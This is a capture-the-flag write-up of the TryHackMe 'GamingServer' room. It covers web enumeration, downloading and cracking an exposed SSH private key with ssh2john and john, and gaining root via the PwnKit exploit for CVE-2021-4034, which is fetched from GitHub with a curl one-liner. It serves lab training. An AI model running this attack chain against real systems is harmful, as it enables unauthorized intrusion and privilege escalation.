# gamingserver-writeup
A writeup of the TryHackMe CTF challenge 'GamingServer'


Here is a lnk to the room: [GamingServer](https://tryhackme.com/room/gamingserver)

# Initial Enumeration


Starting with a nmap scan I found the services being run on the machine.
nmap syntax: "nmap -T4 -sV -v $IP"

After the scan has completed we see that two ports (22, 80) are open.

<img width="504" alt="image" src="https://user-images.githubusercontent.com/66540055/193349717-d6b30c25-c18a-4bbc-a82b-cd6a796aac38.png">



# Web Enumeration 
Opening the webpage I saw a really cool webpage with some "Lorem ipsum" aka filler text. Checking the page source I saw found a potential username!

<img width="797" alt="image" src="https://user-images.githubusercontent.com/66540055/193353371-6b8253c8-b36f-4104-9cff-cf30a16675bd.png">



After going through all the links available, I began to further enumerate the webserver by using the tool Gobuster:
Gobuster syntax:
"gobuster dir -u http://$IP -w /usr/share/wordlists/rockyou.txt"

After the scan has completed we find the following directories: robots.txt, secret, and uploads.

<img width="509" alt="image" src="https://user-images.githubusercontent.com/66540055/193350890-ee6e6373-11da-4d13-8216-54e024a72022.png">


Checking out the secret page I found a file named secretKey

<img width="280" alt="image" src="https://user-images.githubusercontent.com/66540055/193351053-a570acfb-f132-4d88-8495-f517ad22812e.png">



Opening the file we see that it is a private key:

<img width="263" alt="image" src="https://user-images.githubusercontent.com/66540055/193351171-53dc440c-a846-494c-abaf-0d31be496198.png">



Using curl I downloaded the file.
Curl syntax: "curl -L http://10.10.107.61/secret/secretKey > id_rsa"

Before cracking the private key I went back to check the other webpage found in enumeration, uploads.
Opening the webpage I see that we have a dictonary file, a manifesto text file as well as a meme picture.
Using curl I downloaded the dictionary file into my working directory, I also saved the meme picture incase there is a bit of stentonagrophy in this challenge.

After using exiftool and binwalk I see no stent in the meme picture, so I got down to cracking the private key using ssh2john & john. I used the downloaded dictonary file to bruteforce the hashfile.

ssh2john syntax: "ssh2john id_rsa > id_rsa.hash"
john syntax: "john id_rsa.hash dict.list"

After john has run I see that the password for the private key "<redacted>"
  
<img width="319" alt="image" src="https://user-images.githubusercontent.com/66540055/193352934-2b4ba42c-8dc5-4703-b154-79d6fe0637f5.png">

  
  
  
# Initial Access

Before using the private key I must change the permissions, otherwise it will not be accepted, "chmod 600 id_rsa"
Using the private key and the newly found password I ssh'd into the machine using the username found from the webserver's landing page:
  
<img width="421" alt="image" src="https://user-images.githubusercontent.com/66540055/193353943-d3cb6cc7-8c5c-44b5-a855-479e5145146c.png">
 
# User Flag
Now that I am accessing the machine as a user I see the user.txt file!
  
<img width="213" alt="image" src="https://user-images.githubusercontent.com/66540055/193354695-bcf46821-26b3-45b7-8e9f-1aacfeb1d5a3.png">

  
# Priviledge Escalation
Now that I am in the server, I ran the following to check for bad permissions: 
"find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null"
Nothing much, next I uploaded linpeas to do all the heavy lifting for me using wget and a simple python http server:
  
<img width="952" alt="image" src="https://user-images.githubusercontent.com/66540055/193355463-8d1be9b1-41fa-4e5e-af92-631c8b5109ea.png">

After making the script executable and running it I saw that this machine is vulnerableto CVE-2021-4034:
  
<img width="342" alt="image" src="https://user-images.githubusercontent.com/66540055/193355704-c8827cc2-a689-4c9e-b1b5-89c5cccfd5d7.png">
  
After doing some Google searching I found a really useful toolkit created by Ly4k:
Using this oneliner the toolkit is downloaded "curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit"
I uploaded the toolkit using the same method as uploading linpeas, made it executable and upon executing it I got root!
  
<img width="944" alt="image" src="https://user-images.githubusercontent.com/66540055/193356867-2b911fdf-7c11-4a6f-aa3c-c70af59059ea.png">

# Root flag
Moving to the root directory I found the final flag!
  
<img width="212" alt="image" src="https://user-images.githubusercontent.com/66540055/193357161-9cc235a1-8bbf-4939-bbc7-6962b6de40c2.png">

  
# Final Thoughts
  
All in all this is an extremely easy CTF however this showcases how important it is to make sure that SSH keypairs (id_rsa files) are kept secure and the passwords used are not easily guessable.


